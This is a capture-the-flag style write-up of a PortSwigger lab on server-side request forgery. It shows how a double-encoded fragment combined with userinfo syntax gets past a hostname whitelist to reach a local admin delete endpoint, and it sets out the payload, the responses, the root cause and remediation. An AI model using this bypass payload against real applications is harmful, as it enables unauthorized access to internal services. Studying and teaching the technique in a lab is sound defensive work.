# Lab 06 — SSRF with Whitelist-Based Input Filter

## 1. Overview

| Field | Value |
|---|---|
| Vulnerability Class | Server-Side Request Forgery (Whitelist Bypass — URL Parser Differential) |
| CWE | CWE-918 |
| Difficulty | Expert |
| Source | PortSwigger Web Security Academy |
| Objective | Bypass a whitelist-based anti-SSRF defense to reach `http://localhost/admin` and delete user `carlos` |

## 2. Summary

This application validates `stockApi` against a whitelist, checking that the parsed hostname matches the expected domain, `stock.weliketoshop.net`. Unlike blacklisting, this looks reasonably robust at first glance. The vulnerability arises from a **URL parser differential**: the component performing the whitelist check and the component that actually issues the HTTP request interpret the same URL string differently, specifically around the lesser-known `userinfo@host` and fragment (`#`) syntax defined in the URL specification. By abusing this gap, a URL that satisfies the whitelist check can still be made to resolve to a completely different, attacker/internally-chosen host when the actual request is issued.

## 3. Proof of Concept (PoC)

1. Capture the stock-check request and confirm `stockApi=http://127.0.0.1/` is rejected by the whitelist.
2. Test embedded-credentials syntax: `stockApi=http://username@stock.weliketoshop.net/` — this is accepted, confirming the parser treats everything before `@` as userinfo and still extracts `stock.weliketoshop.net` as the host.
3. Append a raw `#` after the username (`http://username#@stock.weliketoshop.net/`) — observe this is rejected.
4. Double-URL-encode the `#` character (`#` → `%23` → `%2523`) and resend — observe a suspicious `500 Internal Server Error`, indicating the back-end HTTP client attempted to connect to `username` as a literal hostname (i.e. it decoded the fragment marker and dropped everything after it).
5. Replace `username` with `localhost:80` (and ultimately the admin delete path) to redirect the actual back-end request to the local admin interface:
   ```
   stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
   ```

## 4. Evidence

**Whitelist rejection:**
```
stockApi=http://127.0.0.1/            → rejected: hostname not on the allowlist
```

**Embedded credentials accepted:**
```
stockApi=http://username@stock.weliketoshop.net/   → 200 OK (accepted; host still resolves to stock.weliketoshop.net)
```

**Raw fragment rejected, double-encoded fragment accepted with a tell-tale error:**
```
stockApi=http://username#@stock.weliketoshop.net/        → rejected
stockApi=http://username%2523@stock.weliketoshop.net/    → 500 Internal Server Error
```

**Final exploit:**
```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```
Response: `200 OK`, lab marked **Solved**.

## 5. Root Cause Analysis

**Attacker perspective:** The exploit relies on the fact that `username@hostname` syntax is valid per the URL spec but rarely considered by ad-hoc whitelist implementations, which often just look for the expected domain string anywhere in the URL. Once the validating component is satisfied that `stock.weliketoshop.net` appears as the host, it passes the whole string through. The decoupled component that actually issues the back-end request decodes the double-encoded `%2523` into a literal `#`, which (per the URL spec) marks the start of a fragment — everything from `#` onward, including `@stock.weliketoshop.net/...`, is treated as a fragment and discarded from the authority component. What remains as the actual host to connect to is `localhost:80`, the attacker's real target.

**Defender perspective:** This is the canonical SSRF whitelist bypass pattern: **two different pieces of code parse the "same" URL differently.** The validating code is a loose, partial parser (or regex) that is satisfied as long as the expected substring is present somewhere; the requesting code is a full RFC-3986-compliant parser that correctly, but differently, resolves userinfo, host, and fragment components. Because double-URL-encoding causes the two components to decode the string a different number of times before inspecting it, they end up looking at functionally different strings.

## 6. Impact

Identical end state to Lab 01/03 (unauthenticated access to the admin panel, arbitrary user deletion), but demonstrates that even carefully designed, positive-security (whitelist) filters are not safe if validation and execution don't share a single, consistent, specification-compliant URL parser.

## 7. Remediation

- Use a single, well-tested URL-parsing library for **both** validation and the actual outbound request — never validate with one parser/regex and request with another.
- After parsing, validate the extracted **host** component specifically (not just "is this substring present anywhere in the URL"), and explicitly reject URLs containing userinfo (`user:pass@`) components for this use case, since there is rarely a legitimate reason for a stock-check URL to carry credentials.
- Be aware that encoding (including double-encoding) can cause different components to see different literal strings; decode and canonicalize exactly once, in the component responsible for making the trust decision, immediately before that decision is made.
- Favor avoiding attacker-controlled URLs for server-side fetches entirely (see Lab 01's remediation) over attempting to perfect whitelist validation.

## 8. References

- [PortSwigger — SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf)
- [PortSwigger — URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf)
- [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
